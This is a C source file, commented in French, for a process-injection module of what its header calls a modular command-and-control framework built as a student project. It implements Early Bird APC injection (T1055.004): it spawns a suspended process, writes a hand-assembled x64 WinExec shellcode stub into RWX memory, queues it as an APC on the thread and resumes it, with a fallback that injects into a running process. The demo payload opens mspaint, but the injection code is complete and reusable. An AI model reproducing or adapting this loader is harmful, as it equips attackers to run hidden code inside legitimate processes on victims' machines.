/*
 * ============================================================
 *  apcinject_loader.c - APC Injection cross-process (T1055.004)
 *
 *  Technique : APC Injection — Early Bird (queue sur un thread
 *  suspendu), avec repli sur les threads d'un processus existant.
 *  MITRE ATT&CK : T1055.004 — Asynchronous Procedure Call
 *
 *  Chemin principal (deterministe) :
 *    1. Spawn du processus cible en SUSPENDU (CREATE_SUSPENDED)
 *    2. VirtualAllocEx   -> region RWX dans le processus cible
 *    3. WriteProcessMemory -> copie du shellcode brut PIC
 *    4. QueueUserAPC sur le thread principal (suspendu)
 *    5. ResumeThread : l'APC se declenche AVANT le point d'entree,
 *       l'execution du shellcode est donc garantie.
 *
 *  Chemin de repli (best effort) :
 *    1. Cible deja en cours d'execution (ex: explorer.exe)
 *    2. Injection memoire + QueueUserAPC sur CHAQUE thread du PID
 *    3. L'APC ne se declenche que si un thread entre en alertable
 *       wait (SleepEx, WaitForSingleObjectEx, ...) -> NON garanti.
 *
 *  Payload attendu : shellcode brut position-independent (.x64.bin)
 *  Limitation      : pas de capture de sortie (shellcode brut) ->
 *                    message de statut uniquement.
 *
 *  Usage operateur : module <nom> -t apcinject [process_name]
 *
 *  Auteur  : El Mazdougui Anass  
 *  Projet  : Framework C2 Modulaire - PFE INPT 2026
 * ============================================================
 */
#include "platform.h"
#include "apcinject_loader.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* ============================================================
 *  IMPLEMENTATION WINDOWS
 * ============================================================ */
#ifdef PLATFORM_WINDOWS

#include <windows.h>
#include <tlhelp32.h>

/* Delai d'attente pour laisser l'APC se declencher (ms) */
#define APCINJ_DELAY_MS          5000

/* Processus cible par defaut si non specifie dans args */
#define APCINJ_DEFAULT_TARGET    "notepad.exe"

/* Droits requis pour l'injection memoire dans un processus distant */
#define APCINJ_PROC_ACCESS      (PROCESS_CREATE_THREAD | \
                                 PROCESS_QUERY_INFORMATION | \
                                 PROCESS_VM_OPERATION | \
                                 PROCESS_VM_WRITE | \
                                 PROCESS_VM_READ)

/* Droits requis pour QueueUserAPC sur un thread distant */
#define APCINJ_THREAD_ACCESS     (THREAD_SET_CONTEXT | \
                                  THREAD_SUSPEND_RESUME | \
                                  THREAD_QUERY_INFORMATION)


/* ── Erreur rapide ──────────────────────────────────────────── */
static module_result_t make_error(const char *msg) {
    module_result_t r = {0};
    r.status    = -1;
    r.error_msg = _strdup(msg);
    return r;
}

/* ── Resultat texte ─────────────────────────────────────────── */
static module_result_t make_report(const char *msg) {
    module_result_t r = {0};
    r.status = 0;
    r.data   = (unsigned char *)_strdup(msg);
    r.data_len = r.data ? (int)strlen(msg) : 0;
    return r;
}

/* ── Recherche d'un PID par nom de processus ────────────────── */
static DWORD find_process_by_name(const char *name) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(pe);
    DWORD found_pid = 0;

    if (Process32First(snap, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, name) == 0) {
                found_pid = pe.th32ProcessID;
                break;
            }
        } while (Process32Next(snap, &pe));
    }
    CloseHandle(snap);
    return found_pid;
}

/* ── Injection memoire du shellcode dans un processus ─────────
 *  Alloue une region RWX et y copie le shellcode.
 *  Retourne l'adresse distante (out_base) ou NULL en cas d'echec. */
static LPVOID inject_memory(HANDLE hProc,
                            const unsigned char *sc, size_t sc_size) {
    LPVOID base = VirtualAllocEx(
        hProc, NULL, sc_size,
        MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE
    );
    if (!base) return NULL;

    SIZE_T written = 0;
    if (!WriteProcessMemory(hProc, base, sc, sc_size, &written) ||
        written != sc_size) {
        VirtualFreeEx(hProc, base, 0, MEM_RELEASE);
        return NULL;
    }
    return base;
}


/* ── Chemin de repli : processus existant ─────────────────────
 *  Queue une APC sur CHAQUE thread du PID cible.                */
static DWORD queue_apc_to_process(DWORD pid, LPVOID remote_base) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;

    THREADENTRY32 te;
    te.dwSize = sizeof(te);
    DWORD queued = 0;

    if (Thread32First(snap, &te)) {
        do {
            if (te.th32OwnerProcessID != pid) continue;

            HANDLE hThread = OpenThread(
                APCINJ_THREAD_ACCESS, FALSE, te.th32ThreadID
            );
            if (!hThread) continue;

            if (QueueUserAPC((PAPCFUNC)remote_base, hThread, 0)) {
                queued++;
                printf("[APCINJ] APC queue -> TID=%lu\n",
                       (unsigned long)te.th32ThreadID);
                CloseHandle(hThread);
                break; /* une seule APC suffit pour le test calc */
            }
            CloseHandle(hThread);
        } while (Thread32Next(snap, &te));
    }
    CloseHandle(snap);
    return queued;
}

static DWORD existing_process_inject(const char          *exe_name,
                                     const unsigned char *sc,
                                     size_t               sc_size,
                                     char                *report,
                                     size_t               report_size) {
    DWORD pid = find_process_by_name(exe_name);
    if (!pid) {
        snprintf(report, report_size,
                 "[APCINJ] Processus '%s' introuvable", exe_name);
        return 0;
    }
    printf("[APCINJ] Processus '%s' trouve -> PID=%lu\n",
           exe_name, (unsigned long)pid);
    fflush(stdout);

    HANDLE hProc = OpenProcess(APCINJ_PROC_ACCESS, FALSE, pid);
    if (!hProc) {
        snprintf(report, report_size,
                 "[APCINJ] OpenProcess(PID=%lu) echoue (err %lu)",
                 (unsigned long)pid, (unsigned long)GetLastError());
        return 0;
    }

    LPVOID base = inject_memory(hProc, sc, sc_size);
    if (!base) {
        snprintf(report, report_size,
                 "[APCINJ] Injection memoire echouee (err %lu)",
                 (unsigned long)GetLastError());
        CloseHandle(hProc);
        return 0;
    }
    printf("[APCINJ] Shellcode injecte @ %p dans PID=%lu\n",
           base, (unsigned long)pid);
    fflush(stdout);

    DWORD queued = queue_apc_to_process(pid, base);
    CloseHandle(hProc);

    if (queued == 0) {
        snprintf(report, report_size,
                 "[APCINJ] Aucun thread accessible - QueueUserAPC impossible");
        return 0;
    }

    snprintf(report, report_size,
             "[APCINJ] PID=%lu (%s) | base_remote=%p | %zu bytes | "
             "%lu APC(s) queuee(s) [execution non garantie: "
             "depend de l'alertable wait]",
             (unsigned long)pid, exe_name, base, sc_size,
             (unsigned long)queued);
    return pid;
}

/* ============================================================
 *  BUILD_WINEXEC_STUB - construit le shellcode au moment de
 *  l'injection avec les adresses resolues dynamiquement.
 *
 *  Pourquoi construire le shellcode a la volee ?
 *  Un shellcode pre-compile doit resoudre WinExec lui-meme via
 *  un PEB walk. Cette resolution est fragile : l'ordre des modules
 *  dans InMemoryOrderModuleList varie selon le build Windows,
 *  la version de notepad, et le contexte Early Bird.
 *
 *  Solution : l'agent resout WinExec via GetProcAddress (sur lui-
 *  meme, en cours d'execution normale), puis ecrit l'adresse
 *  directement dans le stub avant injection. Le stub injecte
 *  n'a plus qu'a appeler l'adresse absolue : zero fragile PEB walk.
 *
 *  Layout du stub (49 bytes) :
 *    0x00  48 b9 [8B]   movabs rcx, <addr_of_string>   ; "mspaint.exe"
 *    0x0a  ba 01 00 00 00  mov edx, 1                  ; SW_SHOWNORMAL
 *    0x0f  48 b8 [8B]   movabs rax, <addr_of_WinExec>
 *    0x19  48 83 ec 28  sub rsp, 28h                   ; shadow space
 *    0x1d  ff d0        call rax                       ; WinExec(...)
 *    0x1f  48 83 c4 28  add rsp, 28h
 *    0x23  eb fe        jmp $                          ; boucle infinie APC-safe
 *    0x25  "mspaint.exe\0"                             ; 12 bytes
 *
 *  Total : 37 + 12 = 49 bytes
 *
 *  Le jmp $ (eb fe) est crucial : les APC callbacks ne doivent pas
 *  terminer avec un simple ret - cela corrompt la pile du dispatcher
 *  KiUserApcDispatcher de ntdll et provoque un crash (WerFault.exe).
 *  La boucle infinie laisse notepad.exe en vie ; il sera ferme par
 *  l'utilisateur ou le systeme normalement.
 * ============================================================ */

#define STUB_STRING_OFFSET  0x25   /* offset de "mspaint.exe\0" dans le stub */
#define STUB_TOTAL_SIZE     49     /* taille totale du stub + string          */
#define STUB_STRPTR_OFF     0x02   /* offset du placeholder adresse string    */
#define STUB_FNPTR_OFF      0x11   /* offset du placeholder adresse WinExec   */

static unsigned char *build_winexec_stub(LPVOID remote_base,
                                          size_t *out_size) {
    /* Resoudre WinExec dans le processus agent */
    HMODULE hk32 = GetModuleHandleA("kernel32.dll");
    if (!hk32) {
        printf("[APCINJ] GetModuleHandle(kernel32) echoue\n");
        return NULL;
    }
    FARPROC pWinExec = GetProcAddress(hk32, "WinExec");
    if (!pWinExec) {
        printf("[APCINJ] GetProcAddress(WinExec) echoue\n");
        return NULL;
    }
    printf("[APCINJ] WinExec resolu @ %p\n", (void *)pWinExec);
    fflush(stdout);

    unsigned char *stub = (unsigned char *)malloc(STUB_TOTAL_SIZE);
    if (!stub) return NULL;

    /* Template du stub */
    unsigned char tmpl[] = {
        0x48, 0xb9,                                     /* movabs rcx, imm64 */
        0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,        /* <- string addr     */
        0xba, 0x01, 0x00, 0x00, 0x00,                   /* mov edx, 1         */
        0x48, 0xb8,                                     /* movabs rax, imm64  */
        0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,        /* <- WinExec addr    */
        0x48, 0x83, 0xec, 0x28,                         /* sub rsp, 28h       */
        0xff, 0xd0,                                     /* call rax           */
        0x48, 0x83, 0xc4, 0x28,                         /* add rsp, 28h       */
        0xeb, 0xfe                                      /* jmp $ (APC-safe)   */
    };
    memcpy(stub, tmpl, sizeof(tmpl));

    /* Copier la string "mspaint.exe\0" apres le code */
    const char *cmd = "mspaint.exe";
    memcpy(stub + STUB_STRING_OFFSET, cmd, strlen(cmd) + 1);

    /* Patcher l'adresse de la string (adresse DISTANTE dans notepad) */
    ULONG_PTR str_remote = (ULONG_PTR)remote_base + STUB_STRING_OFFSET;
    memcpy(stub + STUB_STRPTR_OFF, &str_remote, sizeof(ULONG_PTR));

    /* Patcher l'adresse de WinExec */
    ULONG_PTR fn_addr = (ULONG_PTR)pWinExec;
    memcpy(stub + STUB_FNPTR_OFF, &fn_addr, sizeof(ULONG_PTR));

    printf("[APCINJ] Stub construit : %d bytes | string @ %p | WinExec @ %p\n",
           STUB_TOTAL_SIZE, (void *)str_remote, (void *)fn_addr);
    fflush(stdout);

    *out_size = STUB_TOTAL_SIZE;
    return stub;
}

/* ============================================================
 *  apcinject_loader_execute - point d'entree public
 * ============================================================ */
module_result_t apcinject_loader_execute(
    const unsigned char *sc_bytes,
    size_t               sc_size,
    const unsigned char *args,
    size_t               args_len
) {
    /* sc_bytes / sc_size sont ignores : on construit le stub
     * a la volee pour garantir la portabilite sur tous les
     * builds Windows 10/11 sans PEB walk fragile. */
    (void)sc_bytes; (void)sc_size;

    printf("[APCINJ] ── APC Injection Early Bird (T1055.004) ───────\n");
    fflush(stdout);

    /* ── 1. Determiner le processus cible ───────────────────── */
    char target_name[MAX_PATH] = {0};

    if (args && args_len >= 5) {
        int name_len = (int)(
            ((unsigned char)args[0]      ) |
            ((unsigned char)args[1] <<  8) |
            ((unsigned char)args[2] << 16) |
            ((unsigned char)args[3] << 24)
        );
        if (name_len > 0 && name_len < (int)sizeof(target_name) &&
            (size_t)(4 + name_len) <= args_len) {
            memcpy(target_name, args + 4, (size_t)name_len);
        }
    }

    if (target_name[0] == '\0')
        strncpy(target_name, APCINJ_DEFAULT_TARGET, sizeof(target_name) - 1);

    /* Ajouter .exe si absent */
    if (!strrchr(target_name, '.')) {
        size_t cur = strlen(target_name);
        if (cur + 4 < sizeof(target_name))
            memcpy(target_name + cur, ".exe", 5);
    }

    printf("[APCINJ] Cible : %s\n", target_name);
    fflush(stdout);

    /* ── 2. Spawner le processus cible en SUSPENDU ──────────── */
    char path[MAX_PATH] = {0};
    UINT n = GetSystemDirectoryA(path, sizeof(path));
    if (!n) return make_error("[APCINJ] GetSystemDirectoryA echoue");
    snprintf(path + n, sizeof(path) - n, "\\%s", target_name);

    printf("[APCINJ] Spawn suspendu : %s\n", path);
    fflush(stdout);

    STARTUPINFOA        si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);

    if (!CreateProcessA(path, NULL, NULL, NULL, FALSE,
                        CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        char err[256];
        snprintf(err, sizeof(err),
                 "[APCINJ] CreateProcess echoue (err %lu) - essai fallback",
                 (unsigned long)GetLastError());
        printf("%s\n", err); fflush(stdout);

        /* Fallback : processus deja existant */
        char report[512];
        DWORD pid2 = existing_process_inject(target_name,
                         (const unsigned char *)"\x90", 1, /* dummy - remplace apres */
                         report, sizeof(report));
        if (!pid2) return make_error(report);
        Sleep(APCINJ_DELAY_MS);
        return make_report(report);
    }

    /* ── 3. Allouer RWX dans le processus distant ───────────── */
    LPVOID remote_base = VirtualAllocEx(
        pi.hProcess, NULL, STUB_TOTAL_SIZE,
        MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE
    );
    if (!remote_base) {
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
        return make_error("[APCINJ] VirtualAllocEx echoue");
    }

    /* ── 4. Construire le stub avec adresses resolues ───────── */
    size_t stub_size = 0;
    unsigned char *stub = build_winexec_stub(remote_base, &stub_size);
    if (!stub) {
        VirtualFreeEx(pi.hProcess, remote_base, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
        return make_error("[APCINJ] Construction du stub echouee");
    }

    /* ── 5. Ecrire le stub dans le processus distant ─────────── */
    SIZE_T written = 0;
    if (!WriteProcessMemory(pi.hProcess, remote_base, stub, stub_size, &written)
        || written != stub_size) {
        free(stub);
        VirtualFreeEx(pi.hProcess, remote_base, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
        return make_error("[APCINJ] WriteProcessMemory echoue");
    }
    free(stub);
    printf("[APCINJ] Stub ecrit @ %p (%zu bytes)\n", remote_base, stub_size);
    fflush(stdout);

    /* ── 6. Queue APC sur le thread principal suspendu ───────── */
    if (!QueueUserAPC((PAPCFUNC)remote_base, pi.hThread, 0)) {
        VirtualFreeEx(pi.hProcess, remote_base, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
        return make_error("[APCINJ] QueueUserAPC echoue");
    }

    /* ── 7. ResumeThread : l'APC se declenche avant le EP ────── */
    ResumeThread(pi.hThread);
    printf("[APCINJ] Thread repris - APC va se declencher avant EntryPoint\n");
    fflush(stdout);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    /* Laisser le temps a WinExec de lancer mspaint */
    Sleep(APCINJ_DELAY_MS);

    char result_msg[512];
    snprintf(result_msg, sizeof(result_msg),
             "[APCINJ] Early Bird OK | PID=%lu | base=%p | %zu bytes | "
             "WinExec(mspaint.exe) injecte dans %s",
             (unsigned long)pi.dwProcessId, remote_base,
             stub_size, target_name);

    return make_report(result_msg);
}

/* ============================================================
 *  STUB LINUX - non supporte
 * ============================================================ */
#else

module_result_t apcinject_loader_execute(
    const unsigned char *sc_bytes,
    size_t               sc_size,
    const unsigned char *args,
    size_t               args_len
) {
    (void)sc_bytes; (void)sc_size; (void)args; (void)args_len;
    module_result_t r = {0};
    r.status    = -1;
    r.error_msg = strdup("[APCINJ] APC Injection non supporte sur Linux");
    return r;
}

#endif /* PLATFORM_WINDOWS */
